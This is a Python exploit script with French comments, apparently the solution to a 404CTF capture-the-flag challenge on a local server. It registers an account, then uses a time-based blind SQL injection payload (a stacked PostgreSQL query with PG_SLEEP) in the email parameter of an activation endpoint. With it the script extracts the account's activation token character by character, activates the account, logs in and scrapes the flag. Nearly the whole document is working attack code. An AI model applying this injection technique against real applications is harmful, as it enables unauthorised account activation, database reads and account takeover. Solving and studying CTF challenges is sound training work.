import requests
import re
import time

BASE_WEB = "http://127.0.0.1:3002/"
PASSWORD = "aabbccdd"
ADMIN_EMAIL = "b3rt1ng@scientos-admin.net"

auth_session = requests.Session()

print(f"[*] Inscription du compte admin : {ADMIN_EMAIL}")
r = auth_session.post(f"{BASE_WEB}/api/auth/register", data={
    "email": ADMIN_EMAIL,
    "username": "specter", 
    "password": PASSWORD,
}, allow_redirects=True)
print(f"[*] Statut de l'inscription : {r.url}")

print("[*] Extraction du jeton d'activation (Time-Based)...")
token_extrait = ""
caracteres_possibles = "0123456789abcdef-"

for position in range(1, 37):
    for char in caracteres_possibles:
        payload = f"inexistant'; SELECT CASE WHEN (SUBSTRING((SELECT value FROM tokens WHERE userId=(SELECT id FROM users WHERE email='{ADMIN_EMAIL}') LIMIT 1),{position},1)='{char}') THEN PG_SLEEP(1) ELSE PG_SLEEP(0) END --"
        
        start_time = time.time()
        r = auth_session.get(f"{BASE_WEB}/api/auth/validate", params={
            "email": payload,
            "token": "test"
        })
        duration = time.time() - start_time
        
        if duration >= 0.8:
            token_extrait += char
            print(f"[+] Position {position} : {char} -> Jeton : {token_extrait}")
            break
    else:
        print(f"[-] Fin de chaîne prématurée à la position {position}")
        break

if len(token_extrait) < 36:
    print("[-] Erreur : Impossible de récupérer le jeton d'activation complet.")
    exit(1)

print(f"[+] Jeton extrait avec succès : {token_extrait}")

print("[*] Activation du compte auprès de l'API...")
r = auth_session.get(f"{BASE_WEB}/api/auth/validate", params={
    "email": ADMIN_EMAIL,
    "token": token_extrait,
}, allow_redirects=True)
print(f"[*] Réponse de l'activation : {r.url}")

print("[*] Tentative de connexion automatique...")
r = auth_session.post(f"{BASE_WEB}/api/auth/login", data={
    "email": ADMIN_EMAIL,
    "password": PASSWORD,
}, allow_redirects=True)

print("[*] Lecture de la page d'accueil...")
r_home = auth_session.get(f"{BASE_WEB}/")
flag = re.search(r'404CTF\{[^}]+\}', r_home.text)

print("\n" + "="*50)
if flag:
    print(f"[+] SCRIPT RÉUSSI ! FLAG REÇU : {flag.group(0)}")
else:
    print("[-] Le script n'a pas pu extraire le flag automatiquement.")